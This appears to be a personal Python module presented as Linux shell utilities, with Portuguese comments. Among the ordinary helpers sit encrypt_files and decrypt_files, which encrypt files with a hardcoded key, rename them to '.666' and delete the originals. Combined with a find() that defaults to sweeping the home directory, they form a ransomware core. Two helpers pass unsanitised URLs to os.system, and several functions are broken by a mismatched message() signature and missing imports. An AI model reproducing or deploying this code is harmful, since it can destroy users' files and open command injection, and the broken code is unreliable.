"""
shell_utilities.py - A Python implementation of common Linux/Unix commands
"""
# === Built-in modules ===
import os
import re
import time
import tarfile
import fnmatch
import shutil
import random
import getpass
import platform
from pathlib import Path

# === Third-party modules ===
import psutil
from colorama import Fore, Back, Style, init as colorama_init
from cryptography.fernet import Fernet
import requests
# === Initialize colorama (for cross-platform support) ===
colorama_init(autoreset=True)

def message(message, color=Fore.WHITE, verbose=False) -> None:
    """
    Imprime uma mensagem com cores para melhor visualizacao.
    Args:
        message (str): A mensagem a ser impressa.
        color (str, optional): A cor da mensagem (padrao: branco).
        verbose (bool, optional): Se a mensagem deve ser impressa (padrao: False).

    Returns:
        None

    """
    print(f"{color}{message}{Style.RESET_ALL}")


def random_color(
    normal_color=True,
    bright_color=True,
    contrast_color=True,
    use_styles=True,
    special_combinations=True
) -> str:
    """
    Retorna uma cor aleatória customizável com base nos tipos de cores disponíveis no colorama.

    Args
        normal_color=(bool): Incluir cores normais (Fore.RED, Fore.GREEN, ...)
        bright_color= (bool): Incluir cores brilhantes (Fore.LIGHTRED_EX, ...)
        contrast_color=(bool): Incluir combinações de Fore + Back
        usar_estilos (bool): Incluir estilos com Style.BRIGHT
        usar_combinacoes_especiais (bool): Incluir misturas visuais únicas com Style + Back

    Returns:
        str: Sequência de estilo/colorama pronta para uso
    """
    cores = []

    if normal_color:
        cores.extend([
            Fore.BLACK, Fore.RED, Fore.GREEN, Fore.YELLOW,
            Fore.BLUE, Fore.MAGENTA, Fore.CYAN, Fore.WHITE
        ])

    if bright_color:
        cores.extend([
            Fore.LIGHTBLACK_EX, Fore.LIGHTRED_EX, Fore.LIGHTGREEN_EX,
            Fore.LIGHTYELLOW_EX, Fore.LIGHTBLUE_EX, Fore.LIGHTMAGENTA_EX,
            Fore.LIGHTCYAN_EX, Fore.LIGHTWHITE_EX
        ])

    if contrast_color:
        cores.extend([
            Fore.RED + Back.CYAN,
            Fore.GREEN + Back.MAGENTA,
            Fore.YELLOW + Back.BLUE,
            Fore.BLUE + Back.YELLOW,
            Fore.MAGENTA + Back.GREEN,
            Fore.CYAN + Back.RED,
            Fore.WHITE + Back.BLACK
        ])

    if use_styles:
        cores.extend([
            Style.BRIGHT + Fore.RED,
            Style.BRIGHT + Fore.GREEN,
            Style.BRIGHT + Fore.YELLOW,
            Style.BRIGHT + Fore.BLUE,
            Style.BRIGHT + Fore.MAGENTA,
            Style.BRIGHT + Fore.CYAN
        ])

    if special_combinations:
        cores.extend([
            Style.BRIGHT + Fore.WHITE + Back.RED,
            Style.BRIGHT + Fore.YELLOW + Back.BLUE,
            Style.BRIGHT + Fore.CYAN + Back.MAGENTA
        ])

    if not cores:
        return Fore.WHITE  # fallback seguro

    return random.choice(cores)


# BANNER DE MILHOES
def banner(title: str, verbose: bool = True) -> None:

    """
    Mostra o banner colorido com a largura do terminal
    Args:
        title (str): Titulo do banner
        verbose (bool): Flag para habilitar ou desabilitar a impressao das mensagens
    Returns:
        None
    """
    try:
        term_width = os.get_terminal_size().columns
    except:
        term_width = 80  # Fallback width if terminal size can't be determined
    
    title = title.upper()
    title_length = len(title)
    
    # Banner elements
    CORNER_CHAR = '✻'
    TOP_BORDER_CHAR = '═'
    BOTTOM_BORDER_CHAR = '═'
    SIDE_CHAR = '║'
    PADDING_CHAR = ' '
    
    # Calculate available space for title (subtracting corners and side chars)
    available_width = term_width - 4  # 2 corners + 2 side chars
    
    # Create the top and bottom borders
    top_border = CORNER_CHAR + TOP_BORDER_CHAR * (term_width - 2) + CORNER_CHAR
    bottom_border = CORNER_CHAR + BOTTOM_BORDER_CHAR * (term_width - 2) + CORNER_CHAR
    
    # Create title line with centered text
    if title_length > available_width:
        title = title[:available_width-3] + "..."
        title_length = len(title)
    
    padding_total = available_width - title_length
    left_padding = padding_total // 2
    right_padding = padding_total - left_padding
    # MODIFICADO: Formatação simétrica da linha do título
    title_line = f"{SIDE_CHAR}{PADDING_CHAR}{' ' * left_padding}{title}{' ' * right_padding}{PADDING_CHAR}{SIDE_CHAR}"

    
    # Create decorative lines above and below title
    decorative_line = SIDE_CHAR + '─' * (term_width - 2) + SIDE_CHAR
    
    # Print the banner with random colors
    color1 = random_color(
    bright_color=True,
    normal_color=True,
    contrast_color=False,
    use_styles=False,
    special_combinations=False
)
    color2 = random_color(
    bright_color=True,
    normal_color=True,
    contrast_color=False,
    use_styles=False,
    special_combinations=False
)
    color3 = random_color(
    bright_color=True,
    normal_color=True,
    contrast_color=False,
    use_styles=False,
    special_combinations=False
)
    
    message('\n' + top_border, color=color1, verbose=verbose)
    message(decorative_line, color=color2, verbose=verbose)
    message(title_line, color=color3, verbose=verbose)
    message(decorative_line, color=color2, verbose=verbose)
    message(bottom_border, color=color1, verbose=verbose)

# === Core shell utilities ===

def wget(url, output_file=None, verbose=False):
    """
    Função equivalente ao comando wget para download de arquivos usando requests.
    
    Parâmetros:
    - url: URL do arquivo a ser baixado
    - output_file: Nome do arquivo de saída (opcional)
    - verbose: Se True, exibe informações durante o download
    
    Retorno:
    - Nome do arquivo baixado ou None em caso de erro
    """
    try:
        if output_file is None:
            # Extrai o nome do arquivo da URL se não for fornecido
            output_file = url.split('/')[-1].split('?')[0]  # Remove query parameters
            if not output_file:
                output_file = "downloaded_file"
        
        if verbose:
            print(f"Baixando {url} para {output_file}...")
        
        # Faz a requisição com stream=True para baixar arquivos grandes
        with requests.get(url, stream=True) as response:
            response.raise_for_status()  # Verifica se houve erro HTTP
            
            # Obtém o tamanho do arquivo se disponível
            file_size = int(response.headers.get('content-length', 0))
            
            if verbose and file_size:
                print(f"Tamanho do arquivo: {file_size} bytes")
            
            # Escreve o conteúdo no arquivo
            with open(output_file, 'wb') as f:
                for chunk in response.iter_content(chunk_size=8192):
                    if chunk:  # Filtra keep-alive chunks
                        f.write(chunk)
            
        # Verifica se o arquivo foi baixado
        if os.path.exists(output_file):
            if verbose:
                actual_size = os.path.getsize(output_file)
                print(f"Download concluído! Tamanho: {actual_size} bytes")
            return output_file
        else:
            raise Exception("Falha no download - arquivo não foi criado")
            
    except Exception as e:
        print(f"Erro durante o download: {str(e)}")
        return None

# Exemplo de uso:
# wget("https://example.com/file.zip", "meu_arquivo.zip", verbose=True)


def soup(url, save=False, show=False):
    response = requests.get(url)
    soup = bs(response.content, 'html.parser')
    if show:
        print(soup.prettify())
    if save:
        with open("index.html", "w") as f:
            f.write(soup.prettify())
    return soup


def pwd():
    """Return current working directory (like 'pwd')"""
    return os.getcwd()

def clear():
    """Clear the terminal screen (like 'clear')"""
    os.system('cls' if os.name == 'nt' else 'clear')

def cd(path):
    """Change directory (like 'cd')"""
    os.chdir(path)

def ls(path='.', all_files=False, long_format=False):
    """
    List directory contents (like 'ls')

    Args:
        path: Directory path (default: current directory)
        all_files: Show hidden files (like -a flag)
        long_format: Return detailed info (like -l flag)
    """
    items = os.listdir(path)
    if not all_files:
        items = [i for i in items if not i.startswith('.')]
    if long_format:
        return [(item, os.stat(os.path.join(path, item))) for item in items]
    return items

def mkdir(path, parents=False, mode=0o777):
    """
    Create directory (like 'mkdir')

    Args:
        path: Directory path to create
        parents: Create parent directories as needed (like -p flag)
        mode: Permission mode (default: 0o777)
    """
    if parents:
        os.makedirs(path, exist_ok=True, mode=mode)
    else:
        os.mkdir(path, mode=mode)

def rm(path, recursive=False, force=False):
    """
    Remove files/directories (like 'rm')

    Args:
        path: Path to remove
        recursive: Remove directories recursively (like -r)
        force: Ignore errors if file doesn't exist (like -f)
    """
    try:
        if os.path.isdir(path):
            shutil.rmtree(path) if recursive else os.rmdir(path)
        else:
            os.remove(path)
    except Exception as e:
        if not force:
            raise
        message(f"Failed to remove {path}: {e}", level="warning")

def cp(src, dst, recursive=False, preserve_metadata=False):
    """
    Copy files/directories (like 'cp')

    Args:
        src: Source path
        dst: Destination path
        recursive: Copy directories recursively
        preserve_metadata: Preserve file metadata
    """
    if os.path.isdir(src):
        if not recursive:
            raise IsADirectoryError(f"{src} is a directory (use recursive=True)")
        shutil.copytree(src, dst, copy_function=shutil.copy2 if preserve_metadata else shutil.copy)
    else:
        shutil.copy2(src, dst) if preserve_metadata else shutil.copy(src, dst)

def mv(src, dst):
    """Move or rename files (like 'mv')"""
    shutil.move(src, dst)

def touch(path):
    """Create empty file or update timestamp (like 'touch')"""
    Path(path).touch()

def cat(file_path):
    """Display file contents (like 'cat')"""
    with open(file_path) as f:
        return f.read()

def head(file_path, lines=10):
    """Display first lines of file (like 'head')"""
    with open(file_path) as f:
        return [next(f).rstrip() for _ in range(lines)]

def tail(file_path, lines=10):
    """Display last lines of file (like 'tail')"""
    with open(file_path) as f:
        return f.readlines()[-lines:]

def echo(text, newline=True):
    """Print text to terminal (like 'echo')"""
    print(text, end='\n' if newline else '')

def sleep(seconds):
    """Pause execution (like 'sleep')"""
    time.sleep(seconds)

def find(rootdir="~", ext=None, mode="file", save_list=False, output_file="FilesFound.txt", verbose=True):
    """
    Recursively search for files or directories, supporting wildcards (*, ?) in extensions.

    Args:
        rootdir (str): Base directory to start search.
        ext (str): File extension/wildcard pattern (e.g., "*.txt", "*.pdf", "*").
        mode (str): Search mode: 'file', 'dir', or 'all'.
        save_list (bool): Whether to save results to a file.
        output_file (str): Output file path (used if save_list=True).
        verbose (bool): Enable or disable output messages.

    Returns:
        List[str]: List of matching paths.
    """
    def expand_user_path(path):
        return os.path.expanduser(path)

    def find_items(directory, pattern, mode):
        item_list = []
        directory = expand_user_path(directory)

        try:
            for root, dirs, files in os.walk(directory):
                if mode in ("dir", "all"):
                    for d in dirs:
                        full_dir = os.path.join(root, d)
                        item_list.append(full_dir)
                        message(full_dir, level="debug", verbose=verbose)
                if mode in ("file", "all"):
                    for f in files:
                        if pattern is None or fnmatch.fnmatch(f.lower(), pattern.lower()):
                            full_file = os.path.join(root, f)
                            item_list.append(full_file)
                            message(full_file, level="debug", verbose=verbose)
        except PermissionError:
            message(f"Permission denied: {directory}", level="warning", verbose=verbose)
        except Exception as e:
            message(f"Error: {e}", level="error", verbose=verbose)

        return item_list

    if ext is None and mode == "file":
        ext = input("Extension/pattern (e.g., '*.txt' or '*'): ").strip()

    # Padrão padrão para "todos os arquivos" se ext for None ou "*"
    pattern = "*" if ext in (None, "*") else ext

    search_path = expand_user_path(rootdir)
    message(f"Searching in {search_path} (mode={mode}, pattern={pattern})...", level="info", verbose=verbose)

    results = find_items(search_path, pattern, mode)

    if save_list:
        try:
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write("\n".join(results))
            message(f"List saved to: {os.path.abspath(output_file)}", level="success", verbose=verbose)
        except IOError as e:
            message(f"Failed to save list: {e}", level="error", verbose=verbose)

    message(f"Total found: {len(results)}", level="info", verbose=verbose)
    return results

from cryptography.fernet import Fernet

KEY = b'QmmjsJEWUdyufMX_XxZkGZ0TE6ba4aGttqIfBsMyn18='

def encrypt_files(file_list, key=KEY, verbose=True):
    """
    Encrypts files using a predefined key (stored in KEY).
    Renames files with '.666' extension.

    Args:
        file_list (list): List of file paths.
        key (bytes): Predefined encryption key (default: KEY).
        verbose (bool): Show progress messages.
    """
    try:
        fernet = Fernet(key)
        
        for file_path in file_list:
            try:
                if not os.path.isfile(file_path):
                    message(f"File not found: {file_path}", level="warning", verbose=verbose)
                    continue
                
                with open(file_path, "rb") as f:
                    file_data = f.read()
                
                encrypted_data = fernet.encrypt(file_data)
                new_path = file_path + ".666"
                
                with open(new_path, "wb") as f:
                    f.write(encrypted_data)
                
                os.remove(file_path)
                message(f"Encrypted: {file_path} -> {new_path}", level="success", verbose=verbose)
            
            except Exception as e:
                message(f"Failed to encrypt {file_path}: {e}", level="error", verbose=verbose)
    
    except Exception as e:
        message(f"Encryption error: {e}", level="error", verbose=verbose)

def decrypt_files(file_list, key=KEY, verbose=True):
    """
    Decrypts files using the predefined key (KEY).
    Removes '.666' extension to restore original names.

    Args:
        file_list (list): List of encrypted files (.666).
        key (bytes): Predefined key (default: KEY).
        verbose (bool): Show progress messages.
    """
    try:
        fernet = Fernet(key)
        
        for file_path in file_list:
            try:
                if not file_path.endswith(".666"):
                    message(f"Skipped (not a .666 file): {file_path}", level="warning", verbose=verbose)
                    continue
                
                with open(file_path, "rb") as f:
                    encrypted_data = f.read()
                
                decrypted_data = fernet.decrypt(encrypted_data)
                original_path = file_path[:-4]  # Remove '.666'
                
                with open(original_path, "wb") as f:
                    f.write(decrypted_data)
                
                os.remove(file_path)
                message(f"Decrypted: {file_path} -> {original_path}", level="success", verbose=verbose)
            
            except Exception as e:
                message(f"Failed to decrypt {file_path}: {e}", level="error", verbose=verbose)
    
    except Exception as e:
        message(f"Decryption error: {e}", level="error", verbose=verbose)

def grep(path, pattern):
    """Search text in files (like 'grep')"""
    import re
    matches = []
    with open(path) as f:
        for i, line in enumerate(f, 1):
            if re.search(pattern, line):
                matches.append((i, line.strip()))
    return matches

def chmod(path, mode):
    """Change file permissions (like 'chmod')"""
    os.chmod(path, mode)

def chown(path, user=None, group=None):
    """Change file owner/group (like 'chown')"""
    import pwd, grp
    uid = pwd.getpwnam(user).pw_uid if user else -1
    gid = grp.getgrnam(group).gr_gid if group else -1
    os.chown(path, uid, gid)

def ln(src, dst, symbolic=True):
    """Create hard or symbolic link (like 'ln')"""
    os.symlink(src, dst) if symbolic else os.link(src, dst)


def tar_create(archive_name, source_path):
    """Create tar archive (like 'tar -czf')"""
    with tarfile.open(archive_name, "w:gz") as tar:
        tar.add(source_path, arcname=os.path.basename(source_path))

def tar_extract(archive_name, extract_path='.'):
    """Extract tar archive (like 'tar -xzf')"""
    with tarfile.open(archive_name, "r:gz") as tar:
        tar.extractall(path=extract_path)

def df():
    """Show disk usage (like 'df')"""
    return [{
        'device': p.device,
        'mount': p.mountpoint,
        'fs_type': p.fstype,
        'total': shutil.disk_usage(p.mountpoint).total,
        'used': shutil.disk_usage(p.mountpoint).used,
        'free': shutil.disk_usage(p.mountpoint).free
    } for p in psutil.disk_partitions()]

def du(path='.'):
    """Show file space usage (like 'du')"""
    total = 0
    for dirpath, _, filenames in os.walk(path):
        for f in filenames:
            fp = os.path.join(dirpath, f)
            total += os.path.getsize(fp)
    return total

def ps():
    """List processes (like 'ps')"""
    return [{'pid': p.pid, 'name': p.name(), 'status': p.status()} for p in psutil.process_iter()]

def kill(pid, sig=15):
    """Send signal to process (like 'kill')"""
    os.kill(pid, sig)

def whoami():
    """Return current username (like 'whoami')"""
    return getpass.getuser()

def env():
    """Return environment variables (like 'env')"""
    return dict(os.environ)

def uname():
    """Return system information (like 'uname -a')"""
    return {
        'system': platform.system(),
        'node': platform.node(),
        'release': platform.release(),
        'version': platform.version(),
        'machine': platform.machine(),
        'processor': platform.processor()
    }

def which(cmd):
    """Locate command in PATH (like 'which')"""
    for path in os.environ["PATH"].split(os.pathsep):
        full_path = os.path.join(path, cmd)
        if os.path.isfile(full_path) and os.access(full_path, os.X_OK):
            return full_path
    return None

def ping(host, count=4, timeout=2, verbose=False):
    """
    Ping host (platform independent)
    
    Args:
        host (str): Hostname or IP address
        count (int): Number of pings to send
        timeout (int): Timeout in seconds
        verbose (bool): Show detailed output
        
    Returns:
        str: Ping statistics summary
    """
    try:
        from pythonping import ping as py_ping
        response = py_ping(
            target=host,
            count=count,
            timeout=timeout,
            verbose=verbose
        )
        return str(response)
    except ImportError:
        message("pythonping module not installed. Run: pip install pythonping", "error")
        return None
    except Exception as e:
        message(f"Ping failed: {e}", "error")
        return None

def openinbrowser(url):
    """Open URL in default browser (like 'xdg-open')"""
    os.system(f'firefox --private-window {url}')

def aria2(url, savepath):
    """Download file using aria2c"""
    os.makedirs(savepath, exist_ok=True)
    os.system(f'aria2c {url} -d {savepath}')


def save_json(content, filepath, verbose=False):
    try:
        with open(filepath, 'w', encoding='utf-8') as arquivo:
            json.dump(content, arquivo, ensure_ascii=False, indent=4)
        message(f"JSON saved to: {os.path.abspath(filepath)}", color=Fore.GREEN, verbose=verbose)
    except Exception as e:
        message(f"Failed to save JSON: {e}", color=Fore.RED, verbose=verbose)



if __name__ == "__main__":
    while True:
        try:
            clear()
            banner("HELLO WORLD")
            # Add a small delay to prevent flickering and reduce CPU usage
            time.sleep(0.1)
        except KeyboardInterrupt:
            clear()
            banner("GOODBYE WORLD")
            break  # Exit the loop after handling the interrupt
